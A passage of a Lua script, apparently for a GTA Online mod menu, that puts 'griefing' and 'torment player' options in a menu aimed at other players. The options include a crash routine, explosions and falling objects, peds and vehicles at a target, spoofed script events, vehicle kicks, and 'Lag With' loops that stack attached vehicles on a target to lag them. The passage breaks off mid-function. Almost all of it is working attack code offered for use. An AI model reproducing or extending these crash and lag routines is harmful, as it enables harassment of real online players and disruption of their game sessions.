                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                    ENTITY.SET_ENTITY_VISIBLE(ped, false)
                end
                repeat
                    for k, ped in crash_ents do
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_CONST_DRILL", 0, false)
                    end
                    for k, v in entities.get_all_objects_as_pointers() do
                        if entities.get_model_hash(v) == util.joaat("prop_tool_jackham") then
                            entities.delete_by_pointer(v)
                        end
                    end
                    util.yield_once()
                    util.yield_once()
                until not (crash_toggle and players.exists(pid))
                crash_toggle = false
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            else
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            end
    end)

    menu.toggle_loop(tormentplayer, "Crap trail", {"crapon"}, "", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] + 1.5
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 35, 0, false, false, 0, false)
        util.yield(65)
    end)

    menu.toggle_loop(tormentplayer, "Huge Shit On Head", {"hshit"}, "Make a massive shit", function(on_toggle)
    menu.trigger_commands("tp" .. players.get_name(pid))
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z -1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(player, agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true)
    util.yield(100)
    entities.create_object(mshit, c)
    end)

menu.toggle_loop(tormentplayer, "Normal Shit On Head", {"nshit"}, "Make a normale sized shit", function(on_toggle)
    menu.trigger_commands("tp" .. players.get_name(pid))
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z -1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(player, agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true)
    util.yield(100)
    entities.create_object(rshit, c)
end)

    menu.toggle_loop(tormentplayer, "Drop Fake Bags", {"dropfakebags"}, "Old School :D", function()
        local coords = players.get_position(pid)
        coords.z = coords.z + 1.5
        local card = MISC.GET_HASH_KEY("prop_money_bag_01")
        STREAMING.REQUEST_MODEL(card)
        if STREAMING.HAS_MODEL_LOADED(card) == false then  
            STREAMING.REQUEST_MODEL(card)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, card, false, true)
    end)

menu.toggle_loop(tormentplayer, "Glitch Physics", {"glitchphysics"}, "", function(on_toggle)
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("prop_ld_ferris_wheel")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_object(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_object(khanjali, playerpos, 0)
    local vehicle3 = entities.create_object(khanjali, playerpos, 0)
    local vehicle4 = entities.create_object(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
    util.yield(1200)
    entities.delete_by_handle(vehicle1)
end, nil, nil, COMMANDPERM_AGGRESSIVE)


menu.toggle_loop(tormentplayer, "Rain Peds on Player", {"rainingpeds"}, "", function(on_toggle)
    --notification("Rain Peds sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    local ped_c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        all_peds = entities.get_all_peds_as_handles()
    for k,ped in pairs(all_peds) do
        if not PED.IS_PED_A_PLAYER(ped) then
            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
            end
            ENTITY.IS_ENTITY_IN_AIR(ped)
            ENTITY.SET_ENTITY_COORDS(ped, ped_c.x, ped_c.y, ped_c.z)
            ped_c.x = ped_c.x + math.random(-5, 5)
            ped_c.y = ped_c.y + math.random(-5, 5)
            ped_c.z = ped_c.z + math.random(5, 10)
            ENTITY.SET_ENTITY_VELOCITY(ped, 0.0, 0.0, -1.0)
            util.yield(100)
        end
    end
end)

menu.toggle_loop(tormentplayer, "Rain Vehicles on Player", {"rainveh"}, "", function(on_toggle)
    --notification("Rain Vehicles sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    local ped_c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        all_peds = entities.get_all_vehicles_as_handles()
    for k,ped in pairs(all_peds) do
        if not PED.IS_PED_A_PLAYER(ped) then
            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
            end
            ENTITY.IS_ENTITY_IN_AIR(ped)
            ENTITY.SET_ENTITY_COORDS(ped, ped_c.x, ped_c.y, ped_c.z)
            ped_c.x = ped_c.x + math.random(-5, 5)
            ped_c.y = ped_c.y + math.random(-5, 5)
            ped_c.z = ped_c.z + math.random(5, 10)
            ENTITY.SET_ENTITY_VELOCITY(ped, 0.0, 0.0, -1.0)
            util.yield(100)
        end
    end
end)


menu.toggle_loop(tormentplayer, "Rain Objects on Player", {"rainobj"}, "", function(on_toggle)
    --notification("Rain Objects sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    local ped_c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        all_peds = entities.get_all_objects_as_handles()
    for k,ped in pairs(all_peds) do
        if not PED.IS_PED_A_PLAYER(ped) then
            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
            end
            ENTITY.IS_ENTITY_IN_AIR(ped)
            ENTITY.SET_ENTITY_COORDS(ped, ped_c.x, ped_c.y, ped_c.z)
            ped_c.x = ped_c.x + math.random(-5, 5)
            ped_c.y = ped_c.y + math.random(-5, 5)
            ped_c.z = ped_c.z + math.random(5, 10)
            ENTITY.SET_ENTITY_VELOCITY(ped, 0.0, 0.0, -100.0)
            util.yield(0)
        end
    end
end)

menu.toggle_loop(tormentplayer, "Bend There Knees", {"bendknees"}, "Forces them down making them bend there knees.", function(on_toggle)
    for k, ped in pairs(entities.get_all_peds_as_handles()) do
        local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ped, -1, false)
        local locspeed2 = speed
                local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if not PED.IS_PED_A_PLAYER(PedInSeat) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                    vcoords = ENTITY.GET_ENTITY_COORDS(ped, true)
                    speed = 100
                    local x_vec = (holecoords['x']-vcoords['x'])*speed
                    local y_vec = (holecoords['y']-vcoords['y'])*speed
                    local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                    ENTITY.IS_ENTITY_IN_AIR(ped)
                    local ped_c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
                    ped_c.x = ped_c.x + math.random(-50, 50)
                    ped_c.y = ped_c.y + math.random(-50, 50)
                    ped_c.z = ped_c.z + math.random(100, 120)
                    ENTITY.SET_ENTITY_VELOCITY(ped, 0.0, 0.0, -1.0)
                    if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(ped, 0.0);
            end
        end
    end
end)


menu.toggle_loop(tpoptions, "Tp Spread Your Shit", {"tpspread"}, "Note: Great for spreading any kinda mods like gifting vehicles or crash events.", function(on_toggle)
    local player_ped = PLAYER.PLAYER_PED_ID()    
    local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    local pld = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(pld)
    for i=1,1  do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1329.5868, -3041.565, 65.06483)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 12.201786, -2608.5598, 27.00581)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 529.52344, -3159.0903, 46.26378)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 797.6639, -2314.7708, 66.75716)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -904.7783, -1799.8903, 60.525257)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -902.62103, -1797.8055, 68.71026)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -811.026, -1052.471, 84.877464)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -74.7535, -820.54895, 331.0572)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 693.5279, -1200.2932, 45.110516)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1944.0536, -911.7328, 177.15826)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 955.1047, 11.822339, 129.3541)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1329.5868, -3041.565, 65.06483)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -604.4595, 53.186974, 124.79825)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -84.817345, 882.59576, 287.78268)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1755.0154, -75.41939, 137.54353)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 2568.129, 760.6324, 160.43828)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 807.4092, 2714.9368, 103.85771)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 2252.8367, 3330.679, 138.64398)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1970.4495, 2864.2395, 34.49541)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1840.9294, 3868.8608, 54.188793)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 490.04102, 5584.988, 802.92584)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 2313.2842, 5981.442, 136.00969)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -272.11963, 6188.8105, 82.51767)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1329.5868, -3041.565, 65.06483)
        util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
        util.yield(100)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
    util.trigger_script_event(1 << pid, {-1388926377, 27, -1762807505, 0})
end)

---------------------------------------------------------------------------------------------------------------------
menu.toggle_loop(tormentplayer, "Give Wanted", {"givewanted"}, "", function(on_toggle)
        local p_hash = util.joaat("s_m_y_swat_01")
        local c 
        local cop
        for i=0, 5 do
            c = players.get_position(pid)
            c.z = 2500
            request_model_load(p_hash)
            local cop = entities.create_ped(6, p_hash, c, 0)
            FIRE.ADD_OWNED_EXPLOSION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), c.x, c.y, c.z, 1, 100.0, false, true, 0.0)
            util.yield(2000)
            entities.delete_by_handle(cop)
        end
    end)

	ptfxloop = menu.list(griefing, "PTFX Loops", {"ptfxloops"}, "", function(); end)

                	local pos = players.get_position(pid)

--Ptfx

menu.toggle_loop(ptfxloop, "Blood Splash", {"bloodslash"}, "", function(on_toggle)
    --notification("Electric sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "blood_wheel", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "blood_wheel", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
	end)

menu.toggle_loop(ptfxloop, "Electric", {"ptfxelectric"}, "", function(on_toggle)
    --notification("Electric sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_electrical_box", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_electrical_box", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
	end)

menu.toggle_loop(ptfxloop, "Smoke", {"ptfxsmoke"}, "", function(on_toggle)
    --notification("Smoke sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_respray_smoke", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_respray_smoke", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
	end)

menu.toggle_loop(ptfxloop, "Clown Explosions", {"ptfxclown"}, "", function(on_toggle)
    --notification("Clown Explosions sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		request_ptfx_asset("scr_rcbarry2")
		GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_clown_death", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
		request_ptfx_asset("scr_rcbarry2")
		GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_exp_clown", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
	end)

menu.toggle_loop(ptfxloop, "Extinguisher", {"ptfxextinguisher"}, "", function(on_toggle)
    --notification("Extinguisher sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "exp_extinguisher", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "exp_extinguisher", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
	end)

menu.toggle_loop(ptfxloop, "Water Mist", {"ptfxwatermist"}, "", function(on_toggle)
    --notification("Water Mist sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_anim_bm_water_mist", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_anim_bm_water_mist", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
	end)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



menu.toggle_loop(tormentplayer, "Laughter Torment", {"laughter"}, "Only works when they are on foot.", function(on_toggle)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local voice = "A_F_M_EASTSA_01_LATINO_FULL_01"
        local speech = "FEMALE_DISTANT_LAUGH"
        local z_off = 0
        if PED.IS_PED_IN_ANY_VEHICLE(target_ped, false) then 
            z_off = get_model_size(ENTITY.GET_ENTITY_MODEL(PED.GET_VEHICLE_PED_IS_IN(target_ped, false))).z
        end
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, 0.0, -1.0, 0.0 + z_off)
        request_model_load(util.joaat("s_f_m_shop_high"))
        local voice_ped = entities.create_ped(28, util.joaat("s_f_m_shop_high"), coords, 0)
        ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(voice_ped, true, false)
        ENTITY.SET_ENTITY_VISIBLE(voice_ped, false, 0)
        ENTITY.FREEZE_ENTITY_POSITION(voice_ped, true)
        ENTITY.SET_ENTITY_INVINCIBLE(voice_ped, true)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(voice_ped, speech, voice, "SPEECH_PARAMS_FORCE_SHOUTED", 0)
        util.yield(3000)
        entities.delete_by_handle(voice_ped)
    end)


	menu.toggle_loop(griefing, "Kick from vehicle", {"kickveh"}, "Little laggy when looped might find a new way to do this", function(on_toggle)
	    menu.trigger_commands("vehkick" .. players.get_name(pid))
	end)

        
local function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        util.yield()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end

	lagwiths = menu.list(griefing, "Lag With Shit", {}, "", function(); end)

    menu.toggle_loop(lagwiths, "Toggle All", {"togglelagwiths"}, "", function(on_toggle)
        if on_toggle then
            menu.trigger_commands("lagwitharmytrailer2" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithbarracks" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithbarracks3" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithdune" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithtugs" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithtugsv2" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithcargos" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithcargosv2" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithsubs" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithsubsv2" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithkhanjali" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithkhanjaliv2" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithfreight" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithfreightcar" .. players.get_name(pid))
            util.yield(100)
        else
            menu.trigger_commands("lagwitharmytrailer2" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithbarracks" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithbarracks3" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithdune" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithtugs" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithtugsv2" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithcargos" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithcargosv2" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithsubs" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithsubsv2" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithkhanjali" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithkhanjaliv2" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithfreight" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("lagwithfreightcar" .. players.get_name(pid))
            util.yield(100)
            end
        end)

    menu.toggle_loop(lagwiths, "Lag With Armytrailer2", {"lagwitharmytrailer2"}, "", function()
        local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerpos = ENTITY.GET_ENTITY_COORDS(id)
        playerpos.z = playerpos.z + 3
        local khanjali = util.joaat("armytrailer2")
        STREAMING.REQUEST_MODEL(khanjali)
        while not STREAMING.HAS_MODEL_LOADED(khanjali) do
            util.yield()
        end
    
        local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
            ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
        local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
        local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
        local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
        util.yield(10000)
    end)

menu.toggle_loop(lagwiths, "Lag With Barracks", {"lagwithbarracks"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("barracks")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
